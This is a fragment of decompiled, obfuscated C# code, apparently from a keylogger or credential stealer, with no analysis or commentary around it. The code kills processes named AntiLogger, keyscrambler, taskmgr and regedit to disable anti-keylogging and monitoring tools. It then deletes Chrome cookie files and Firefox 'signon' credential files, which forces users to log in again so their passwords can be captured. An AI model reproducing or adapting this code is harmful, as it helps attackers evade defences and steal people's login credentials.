			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName2 = Process.GetProcessesByName("AntiLogger");
			Process[] array2 = processesByName2;
			*(int*)((byte*)ptr + 4) = 0;
			while (true)
			{
				((byte*)ptr)[12] = ((*(int*)((byte*)ptr + 4) < array2.Length) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[12] != 0)
				{
					Process process2 = array2[*(int*)((byte*)ptr + 4)];
					process2.Kill();
					checked
					{
						(*unchecked((int*)((byte*)ptr + 4)))++;
						continue;
					}
				}
				break;
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName3 = Process.GetProcessesByName("keyscrambler");
			Process[] array3 = processesByName3;
			*(int*)((byte*)ptr + 8) = 0;
			while (true)
			{
				((byte*)ptr)[12] = ((*(int*)((byte*)ptr + 8) < array3.Length) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[12] != 0)
				{
					Process process3 = array3[*(int*)((byte*)ptr + 8)];
					process3.Kill();
					checked
					{
						(*unchecked((int*)((byte*)ptr + 8)))++;
						continue;
					}
				}
				break;
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private unsafe void method_9(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[9];
		try
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			Process[] array = processesByName;
			*(int*)ptr = 0;
			while (true)
			{
				((byte*)ptr)[8] = ((*(int*)ptr < array.Length) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[8] != 0)
				{
					Process process = array[*(int*)ptr];
					process.Kill();
					checked
					{
						(*unchecked((int*)ptr))++;
						continue;
					}
				}
				break;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName2 = Process.GetProcessesByName("regedit");
			Process[] array2 = processesByName2;
			*(int*)((byte*)ptr + 4) = 0;
			while (true)
			{
				((byte*)ptr)[8] = ((*(int*)((byte*)ptr + 4) < array2.Length) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[8] != 0)
				{
					Process process2 = array2[*(int*)((byte*)ptr + 4)];
					process2.Kill();
					checked
					{
						(*unchecked((int*)((byte*)ptr + 4)))++;
						continue;
					}
				}
				break;
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private unsafe void method_10(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[2];
		try
		{
			Class15.smethod_38(this);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies";
			((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(text);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Extension Cookies";
			((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(text2);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
			*(bool*)ptr = Directory.Exists(text3);
			if (*(bool*)ptr)
			{
				IEnumerator<string> enumerator = default(IEnumerator<string>);
				try
				{
					enumerator = ((ServerComputer)Class1.smethod_0()).get_FileSystem().GetDirectories(text3).GetEnumerator();
					IEnumerator<string> enumerator2 = default(IEnumerator<string>);
					while (true)
					{
						((byte*)ptr)[1] = (enumerator.MoveNext() ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[1] == 0)
						{
							break;
						}
						string current = enumerator.Current;
						try
						{
							enumerator2 = ((ServerComputer)Class1.smethod_0()).get_FileSystem().GetFiles(current).GetEnumerator();
							while (true)
							{
								((byte*)ptr)[1] = (enumerator2.MoveNext() ? ((byte)1) : ((byte)0));
								if (((byte*)ptr)[1] == 0)
								{
									break;
								}
								string current2 = enumerator2.Current;
								((byte*)ptr)[1] = (current2.Contains("signon") ? ((byte)1) : ((byte)0));
								if (((byte*)ptr)[1] != 0)
								{
									try
									{
										((ServerComputer)Class1.smethod_0()).get_FileSystem().DeleteFile(current2);
									}
									catch (Exception projectError4)
									{
										ProjectData.SetProjectError(projectError4);
										ProjectData.ClearProjectError();
									}
								}
							}
						}
						finally
						{
							((byte*)ptr)[1] = ((enumerator2 != null) ? ((byte)1) : ((byte)0));
							if (((byte*)ptr)[1] != 0)
							{
								enumerator2.Dispose();
							}
						}
					}
				}
				finally
				{
					((byte*)ptr)[1] = ((enumerator != null) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[1] != 0)
					{
						enumerator.Dispose();
					}
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		vmethod_32().Stop();
	}
}
